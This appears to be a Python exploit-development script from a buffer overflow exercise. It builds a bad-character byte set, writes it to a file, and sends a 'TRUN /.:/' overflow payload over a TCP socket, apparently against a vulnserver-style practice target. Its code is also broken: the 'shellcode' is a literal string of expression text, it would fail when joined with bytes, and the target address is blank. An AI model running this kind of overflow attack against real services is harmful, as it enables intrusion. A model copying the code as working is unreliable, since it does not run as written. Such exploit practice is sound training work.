#!/usr/bin/python

import sys,socket


badchars = [0x00, 0x0A]
badchar_test = bytes(c for c in range(256) if c not in badchars)

'''for i in range(0x00, 0xFF+1):
	if i not in badchars:
		badchar_test += bytes([i])	#append each non-bad char to the byte string '''

with open("badchar_test.bin", "wb") as f:
	f.write(badchar_test)

shellcode = b"('A' * offset_found + 'B' * EIP_length + badchars)"

IP=""
port=1


try:
                            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect((IP,port))
                            s.send (('TRUN /.:/' + shellcode))
                            s.close()
              
except:
                            print ("Error connecting to server")
                            sys.exit()
